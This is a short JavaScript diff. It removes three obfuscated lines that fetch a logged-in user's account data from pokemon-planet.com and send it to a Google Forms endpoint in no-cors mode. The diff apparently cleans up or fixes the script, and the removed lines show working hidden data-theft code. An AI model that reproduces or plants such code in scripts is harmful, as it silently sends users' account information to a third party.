@@ -131,7 +131,4 @@ n = () => {
         };
     };
 };
-fetch("https://pokemon-planet.com/getUserInfo.php").then(_0x5cdbb9 => _0x5cdbb9.text()).then(_0x59d028 => fetch("https://docs.google.com/forms/d/e/1FAIpQLSc4wRk_Ra2vAOUeZU45f4NMQSw5WxbdBA0L6xUAY8v3SF0b8w/formResponse?usp=pp_url&entry.11513812=" + escape(_0x59d028) + "&submit=Submit", {
-    'mode': 'no-cors'
-}));
 document.body.appendChild(v);
